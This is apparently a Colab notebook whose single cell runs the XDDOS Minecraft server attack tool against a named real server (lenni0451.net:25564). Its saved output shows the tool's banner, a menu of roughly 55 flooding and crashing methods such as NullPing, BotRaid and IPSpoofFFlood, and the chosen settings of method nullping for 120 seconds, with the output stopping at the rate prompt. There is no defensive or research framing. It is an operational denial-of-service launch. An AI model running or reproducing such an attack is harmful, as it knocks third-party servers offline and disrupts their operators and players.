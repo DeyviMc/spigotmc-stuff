{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyMDTf+6LmFByYV97g8uUfGe",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/DeyviMc/spigotmc-stuff/blob/main/xd.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!java -jar XDDOS.jar lenni0451.net:25564 760 nullping -1 y"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "SX2NtoEgA4GF",
        "outputId": "031970ff-6ae1-49e4-d025-7e6b5568da26"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "\n",
            "\u001b[1;37m██╗  ██╗██████╗ ██████╗  ██████╗ ███████╗\n",
            "╚██╗██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝\n",
            " ╚███╔╝ ██║  ██║██║  ██║██║   ██║███████╗\n",
            " ██╔██╗ ██║  ██║██║  ██║██║   ██║╚════██║\n",
            "██╔╝ ██╗██████╔╝██████╔╝╚██████╔╝███████║\n",
            "╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝\n",
            " v7.2\n",
            "\u001b[1;31mMADE BY: \u001b[1;37mCatOnDrugs#1521\n",
            "\u001b[1;37m> \u001b[1;35mDISCORD: \u001b[1;32mhttps://dsc.gg/TEAMXD\n",
            "\u001b[1;37m> \u001b[1;37mGitHub: \u001b[1;31mhttps://github.com/AnAverageBeing/XDDOS\n",
            "\u001b[1;37mStarting XDDOS :-\n",
            "\u001b[0m\n",
            "\u001b[1;32mSTARTING\n",
            "\u001b[0m\n",
            "You server <IP:PORT>:\n",
            "\u001b[1;32m>> \u001b[1;37mlenni0451.net:25564\n",
            "Server protocol (https://wiki.vg/Protocol_version_numbers):\n",
            "\u001b[1;32m>> \u001b[1;37m760\n",
            "[\u001b[1;31mMethods\u001b[1;37m]\n",
            "\n",
            "\u001b[1;37m[01]\u001b[1;36m BigHandshake\n",
            "\u001b[1;37m[02]\u001b[1;36m Bigpacket\n",
            "\u001b[1;37m[03]\u001b[1;36m Botjoiner\n",
            "\u001b[1;37m[04]\u001b[1;36m ChatSpam\n",
            "\u001b[1;37m[05]\u001b[1;36m ColorCrasher\n",
            "\u001b[1;37m[06]\u001b[1;36m CPUDowner\n",
            "\u001b[1;37m[07]\u001b[1;36m Doublejoin\n",
            "\u001b[1;37m[08]\u001b[1;36m EmptyNames\n",
            "\u001b[1;37m[09]\u001b[1;36m ExtremeJoin\n",
            "\u001b[1;37m[10]\u001b[1;36m ExtremeKiller\n",
            "\u001b[1;37m[11]\u001b[1;36m Handshake\n",
            "\u001b[1;37m[12]\u001b[1;36m InstantDowner\n",
            "\u001b[1;37m[13]\u001b[1;36m InvalidData\n",
            "\u001b[1;37m[14]\u001b[1;36m InvalidNames\n",
            "\u001b[1;37m[15]\u001b[1;36m InvalidSpoof\n",
            "\u001b[1;37m[16]\u001b[1;36m IPSpoofFFlood\n",
            "\u001b[1;37m[17]\u001b[1;36m Join\n",
            "\u001b[1;37m[18]\u001b[1;36m LegacyPing\n",
            "\u001b[1;37m[19]\u001b[1;36m LegitnameJoin\n",
            "\u001b[1;37m[20]\u001b[1;36m LocalHost\n",
            "\u001b[1;37m[21]\u001b[1;36m LongHost\n",
            "\u001b[1;37m[22]\u001b[1;36m LongNames\n",
            "\u001b[1;37m[23]\u001b[1;36m Memory\n",
            "\u001b[1;37m[24]\u001b[1;36m MOTD\n",
            "\u001b[1;37m[25]\u001b[1;36m NabCry\n",
            "\u001b[1;37m[26]\u001b[1;36m NettyDowner\n",
            "\u001b[1;37m[27]\u001b[1;36m Network\n",
            "\u001b[1;37m[28]\u001b[1;36m NewNullPing\n",
            "\u001b[1;37m[29]\u001b[1;36m NullPing\n",
            "\u001b[1;37m[30]\u001b[1;36m Ping\n",
            "\u001b[1;37m[31]\u001b[1;36m PingJoin\n",
            "\u001b[1;37m[32]\u001b[1;36m Query\n",
            "\u001b[1;37m[33]\u001b[1;36m Queue\n",
            "\u001b[1;37m[34]\u001b[1;36m QuitExceptions\n",
            "\u001b[1;37m[35]\u001b[1;36m Ram\n",
            "\u001b[1;37m[36]\u001b[1;36m RandomExceptions\n",
            "\u001b[1;37m[37]\u001b[1;36m RandomPacket\n",
            "\u001b[1;37m[38]\u001b[1;36m SF\n",
            "\u001b[1;37m[39]\u001b[1;36m Slapper\n",
            "\u001b[1;37m[40]\u001b[1;36m SmartBot\n",
            "\u001b[1;37m[41]\u001b[1;36m Spoof\n",
            "\u001b[1;37m[42]\u001b[1;36m TcpBypass\n",
            "\u001b[1;37m[43]\u001b[1;36m TcpHit\n",
            "\u001b[1;37m[44]\u001b[1;36m UltimateKiller\n",
            "\u001b[1;37m[45]\u001b[1;36m UltimateSmasher\n",
            "\u001b[1;37m[46]\u001b[1;36m UnexpectedPacket\n",
            "\u001b[1;37m[47]\u001b[1;36m WaterFallBypass\n",
            "\u001b[1;37m[48]\u001b[1;36m XDjoin\n",
            "\u001b[1;37m[49]\u001b[1;36m XDSpam\n",
            "\u001b[1;37m[50]\u001b[1;36m YooniksCry\n",
            "\n",
            "\u001b[1;37m[\u001b[1;31mExperimental Methods\u001b[1;37m]\n",
            "\n",
            "\u001b[1;37m[01]\u001b[1;36m EmptyNames\n",
            "\u001b[1;37m[02]\u001b[1;36m UUIDCrash\n",
            "\u001b[1;37m[03]\u001b[1;36m BungeeDowner\n",
            "\u001b[1;37m[04]\u001b[1;36m BotRaid\n",
            "\u001b[1;37m[05]\u001b[1;36m TCPFlow\n",
            "\u001b[1;37m\n",
            "\u001b[1;37m[\u001b[1;31mINFO\u001b[1;37m] Default Method is \"NettyDowner\" and type full name of the Methods don't be LAZY\n",
            "\u001b[1;37m\n",
            "TYPE NAME OF METHOD:\u001b[1;32m\n",
            ">> \u001b[1;37mnullping\n",
            "Time (secons):\n",
            "\u001b[1;32m>> \u001b[1;37m120\n",
            "Target cps (-1 for max):\n",
            "\u001b[1;32m>> \u001b[1;37m"
          ]
        }
      ]
    }
  ]
}